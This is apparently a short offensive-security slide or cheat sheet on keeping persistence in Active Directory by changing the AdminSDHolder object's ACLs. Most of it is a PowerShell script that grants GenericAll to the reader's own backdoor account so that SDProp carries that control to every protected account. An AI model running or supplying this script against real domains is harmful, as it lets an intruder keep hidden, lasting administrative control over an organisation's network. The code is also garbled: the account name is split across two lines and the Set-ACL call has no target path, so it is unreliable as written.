Persistent Control via AdminSDHolder ACLs

Modifying the AdminSDHolder object's ACLs to grant persistent permissions.

Targeting the Source

Instead of modifying individual protected accounts, attackers must modify the AdminSDHolder object's ACLs. These changes are then propagated by SDProp.

Prerequisite: Domain Admin

Modifying the AdminSDHolder object itself requires Domain Admin privileges, making this an advanced post-compromise technique.

PowerShell Example: Granting GenericAll
# Requires Domain Admin privileges
# Granting Full Control to an attacker-controlled user on AdminSDHolder

$acl = Get-ACL "AD:\CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$identity = "corp
ewbackdoor" # Your backdoor user
$adRights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
$propagationType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$type = [System.Security.AccessControl.AccessControlType]::Allow
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $identity, $adRights, $type, $inheritanceType, $propagationType
$acl.AddAccessRule($rule)
Set-ACL -ACLObject $acl
Key Takeaway

By modifying AdminSDHolder's ACLs, an attacker can ensure their backdoor account maintains persistent, high-level control over all protected accounts in the domain.
